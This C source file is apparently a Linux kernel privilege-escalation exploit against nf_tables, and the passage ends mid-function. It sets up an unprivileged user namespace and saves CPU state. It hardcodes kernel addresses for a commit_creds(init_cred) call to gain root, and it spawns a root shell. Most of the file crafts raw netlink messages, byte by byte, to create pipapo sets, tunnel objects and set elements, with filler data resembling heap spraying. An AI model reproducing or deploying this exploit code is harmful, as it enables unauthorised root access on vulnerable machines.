#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/mount.h>
#include <linux/keyctl.h>

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void get_root_shell(){
    printf("now pid == %p\n", getpid());
    system("/bin/sh");
}

//CPU绑核
void bindCore(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}


#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>

void err_exit(char *s){
    perror(s);
    exit(-1);
}
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;
    ssize_t n;
    uid_t uid = getuid();
    gid_t gid = getgid();

    /*
     * Create a user namespace first, then map our real uid/gid to 0 inside it.
     * Unsharing other namespaces (net/mount) is more reliable after the mapping
     * is in place.
     */
    if (unshare(CLONE_NEWUSER) < 0)
        err_exit("unshare(CLONE_NEWUSER)");

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    if (tmp_fd >= 0) {
        if (write(tmp_fd, "deny", strlen("deny")) != (ssize_t)strlen("deny"))
            err_exit("write(/proc/self/setgroups)");
        close(tmp_fd);
    } else if (errno != ENOENT) {
        err_exit("open(/proc/self/setgroups)");
    }

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    if (tmp_fd < 0)
        err_exit("open(/proc/self/uid_map)");
    n = snprintf(edit, sizeof(edit), "0 %u 1\n", (unsigned)uid);
    if (n <= 0 || n >= (ssize_t)sizeof(edit))
        err_exit("snprintf(uid_map)");
    if (write(tmp_fd, edit, n) != n)
        err_exit("write(/proc/self/uid_map)");
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    if (tmp_fd < 0)
        err_exit("open(/proc/self/gid_map)");
    n = snprintf(edit, sizeof(edit), "0 %u 1\n", (unsigned)gid);
    if (n <= 0 || n >= (ssize_t)sizeof(edit))
        err_exit("snprintf(gid_map)");
    if (write(tmp_fd, edit, n) != n)
        err_exit("write(/proc/self/gid_map)");
    close(tmp_fd);

    /* Become uid/gid 0 inside the new user namespace. */
    if (setresgid(0, 0, 0) < 0)
        err_exit("setresgid(0)");
    if (setresuid(0, 0, 0) < 0)
        err_exit("setresuid(0)");

    if (unshare(CLONE_NEWNS | CLONE_NEWNET) < 0)
        err_exit("unshare(CLONE_NEWNS|CLONE_NEWNET)");

    /* Don't let mounts propagate back to the parent mount namespace. */
    if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
        err_exit("mount(MS_PRIVATE)");
}

void getRootPrivilige(void)
{
    size_t init_cred = 0xffffffff828505c0;
    int (*commit_creds_ptr)(void *) = 0xffffffff8108db70;
    (*commit_creds_ptr)(init_cred);
}

#include <sys/socket.h>
#include <linux/netlink.h>

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <string.h>

#include "netlink.h"
#include "nf_tables.h"
#include "log.h"

const uint8_t zerobuf[0x40] = {0};

/**
 * create_table(): Register a new table for the inet family
 * @sock: socket bound to the netfilter netlink
 * @name: Name of the new table
 */
void create_table(int sock, const char *name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, TABLEMSG_SIZE);
    nlh->nlmsg_len = TABLEMSG_SIZE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_pid = mypid;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    /** Prepare associated attribute **/
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    set_str8_attr(attr, NFTA_TABLE_NAME, name);

    /* Netlink batch_end message preparation */
    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

void create_owner_table(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_TABLE_NAME":"my_table",
        "NFTA_TABLE_FLAGS":2

    }


    */

    int pay1_size = 24;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,8,0,2,0,0,0,0,2};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
}

/*
    enum nft_set_flags {
        NFT_SET_ANONYMOUS		= 0x1,
        NFT_SET_CONSTANT		= 0x2,
        NFT_SET_INTERVAL		= 0x4,
        NFT_SET_MAP			    = 0x8,
        NFT_SET_TIMEOUT			= 0x10,
        NFT_SET_EVAL			= 0x20,
        NFT_SET_OBJECT			= 0x40,
        NFT_SET_CONCAT			= 0x80,
        NFT_SET_EXPR			= 0x100,
    };
*/
void create_pipapo_set(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_TABLE":"my_table",
        "NFTA_SET_NAME":"my_set@@",
        "NFTA_SET_ID":0,
        "NFTA_SET_KEY_LEN":12,
        "NFTA_SET_FLAGS":196,  
        "NFTA_SET_OBJ_TYPE":1,
        "NFTA_SET_DATA_LEN":16,
        "NFTA_SET_DESC":{
            "NFTA_SET_DESC_CONCAT":{
                "NFTA_LIST_ELEM":{
                    "NFTA_SET_FIELD_LEN":4
                },
                "NFTA_LIST_ELEM@1":{
                    "NFTA_SET_FIELD_LEN":8
                }
            }
        }

    }


    */

    int pay1_size = 100;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,12,8,0,3,0,0,0,0,196,8,0,15,0,0,0,0,1,8,0,7,0,0,0,0,16,32,0,9,128,28,0,2,128,12,0,1,128,8,0,1,0,0,0,0,4,12,0,1,128,8,0,1,0,0,0,0,8};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
}

void create_pipapo_set_MAP(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_TABLE":"my_table",
        "NFTA_SET_NAME":"my_set@@",
        "NFTA_SET_ID":0,
        "NFTA_SET_KEY_LEN":12,
        "NFTA_SET_FLAGS":140,
        "NFTA_SET_DATA_TYPE":4294967040,
        "NFTA_SET_DATA_LEN":16,
        "NFTA_SET_DESC":{
            "NFTA_SET_DESC_CONCAT":{
                "NFTA_LIST_ELEM":{
                    "NFTA_SET_FIELD_LEN":4
                },
                "NFTA_LIST_ELEM@1":{
                    "NFTA_SET_FIELD_LEN":8
                }
            }
        }

    }


    */

    int pay1_size = 100;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    /* nft_set: INTERVAL | MAP | CONCAT (0x8c == 140), with DATA_TYPE + DATA_LEN */
    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,12,8,0,3,0,0,0,0,140,8,0,6,0,255,255,255,0,8,0,7,0,0,0,0,16,32,0,9,128,28,0,2,128,12,0,1,128,8,0,1,0,0,0,0,4,12,0,1,128,8,0,1,0,0,0,0,8};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
}

void add_obj(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_OBJ_TABLE]":"my_table",
        "NFTA_OBJ_TYPE":1,
        "NFTA_OBJ_NAME":"MY_OBJ@@",
        "NFTA_OBJ_DATA":"aaaaaaaabbbbbbbb"

    }


    */

    int pay1_size = 56;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,8,0,3,0,0,0,0,1,12,0,2,0,77,89,95,79,66,74,64,64,20,0,4,0,97,97,97,97,97,97,97,97,98,98,98,98,98,98,98,98};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
}


void add_tunnel_obj(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_OBJ_TABLE":"my_table",
        "NFTA_OBJ_TYPE":6,
        "NFTA_OBJ_NAME":"MY_OBJ@@",
        "NFTA_OBJ_DATA":{
            "NFTA_TUNNEL_KEY_ID":0,
            "NFTA_TUNNEL_KEY_IP":{
                "NFTA_TUNNEL_KEY_IP_DST":0,
                "NFTA_TUNNEL_KEY_IP_SRC":0
            },
            "NFTA_TUNNEL_KEY_OPTS":{
                "NFTA_TUNNEL_KEY_OPTS_GENEVE":{
                    "NFTA_TUNNEL_KEY_GENEVE_CLASS":"AA",
                    "NFTA_TUNNEL_KEY_GENEVE_TYPE":"B",
                    "NFTA_TUNNEL_KEY_GENEVE_DATA":"aaaaaaaabbbbbbbbccccccccdddddddd1111111122222222333333334444444411111111222222223333333344444444aaaaaaaabbbbbbbbccccccccdddddddd"
                },
                "NFTA_TUNNEL_KEY_OPTS_GENEVE@1":{
                    "NFTA_TUNNEL_KEY_GENEVE_CLASS":"AA",
                    "NFTA_TUNNEL_KEY_GENEVE_TYPE":"B",
                    "NFTA_TUNNEL_KEY_GENEVE_DATA":"aaaaaaaabbbbbbbbaaaaaaaabbbbbbbbccccccccddddddddaaaaaaaabbbbbbbbccccccccdddddddd"
                }
            }
        }

    }
    */



    int pay1_size = 328;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {5,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,8,0,3,0,0,0,0,6,12,0,2,0,77,89,95,79,66,74,64,64,36,1,4,128,8,0,1,0,0,0,0,0,20,0,2,128,8,0,2,0,0,0,0,0,8,0,1,0,0,0,0,0,4,1,9,128,152,0,3,128,6,0,1,0,65,65,0,0,5,0,2,0,66,0,0,0,132,0,3,0,97,97,97,97,97,97,97,97,98,98,98,98,98,98,98,98,99,99,99,99,99,99,99,99,100,100,100,100,100,100,100,100,49,49,49,49,49,49,49,49,50,50,50,50,50,50,50,50,51,51,51,51,51,51,51,51,52,52,52,52,52,52,52,52,49,49,49,49,49,49,49,49,50,50,50,50,50,50,50,50,51,51,51,51,51,51,51,51,52,52,52,52,52,52,52,52,97,97,97,97,97,97,97,97,98,98,98,98,98,98,98,98,99,99,99,99,99,99,99,99,100,100,100,100,100,100,100,100,104,0,3,128,6,0,1,0,65,65,0,0,5,0,2,0,66,0,0,0,84,0,3,0,97,97,97,97,97,97,97,97,98,98,98,98,98,98,98,98,97,97,97,97,97,97,97,97,98,98,98,98,98,98,98,98,99,99,99,99,99,99,99,99,100,100,100,100,100,100,100,100,97,97,97,97,97,97,97,97,98,98,98,98,98,98,98,98,99,99,99,99,99,99,99,99,100,100,100,100,100,100,100,100};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
}

void add_set_elem(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_ELEM_LIST_TABLE":"my_table",
        "NFTA_SET_ELEM_LIST_SET":"my_set@@",
        "NFTA_SET_ELEM_LIST_ELEMENTS":{
            "NONAME":{
                "NFTA_SET_ELEM_KEY":{
                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
                },
                "NFTA_SET_ELEM_KEY_END":{
                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
                },
                "NFTA_SET_ELEM_OBJREF":"MY_OBJ@@"

            }
        }

    }


    */

    int pay1_size = 96;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,68,0,3,0,64,0,0,0,24,0,1,0,20,0,1,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,10,0,20,0,1,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,9,0,77,89,95,79,66,74,64,64};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);


    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);

}

void add_set_elem_refobj(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_ELEM_LIST_TABLE":"my_table",
        "NFTA_SET_ELEM_LIST_SET":"my_set@@",
        "NFTA_SET_ELEM_LIST_ELEMENTS":{
            "NONAME":{
                "NFTA_SET_ELEM_KEY":{
                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
                },
                "NFTA_SET_ELEM_KEY_END":{
                    "NFTA_DATA_VALUE":"aaaaaaaabbbbbbbb"
                },
                "NFTA_SET_ELEM_OBJREF":"MY_OBJ@@"

            }
        }

    }


    */

    int pay1_size = 96;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,68,0,3,0,64,0,0,0,24,0,1,0,20,0,1,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,10,0,20,0,1,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,9,0,77,89,95,79,66,74,64,64};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);


    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);

}

void add_set_elem_bind_chain(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    /*
    {
        "NFTA_SET_ELEM_LIST_TABLE":"my_table",
        "NFTA_SET_ELEM_LIST_SET":"my_set@@",
        "NFTA_SET_ELEM_LIST_ELEMENTS":{
            "NONAME":{
                "NFTA_SET_ELEM_KEY":{
                    "NFTA_DATA_VALUE":"aaaabbbbbbbb"
                },
                "NFTA_SET_ELEM_KEY_END":{
                    "NFTA_DATA_VALUE":"aaaabbbbbbbb"
                },
                "NFTA_SET_ELEM_DATA":{
                    "NFTA_DATA_VERDICT":{
                        "NFTA_VERDICT_CODE":-3,
                        "NFTA_VERDICT_CHAIN":"my_chain"
                    }
                }

            }
        }

    }


    */

    int pay1_size = 72;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,44,0,3,128,40,0,0,128,8,0,3,0,0,0,0,2,28,0,2,128,24,0,2,128,8,0,1,0,255,255,255,253,12,0,2,0,109,121,95,99,104,97,105,110};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);


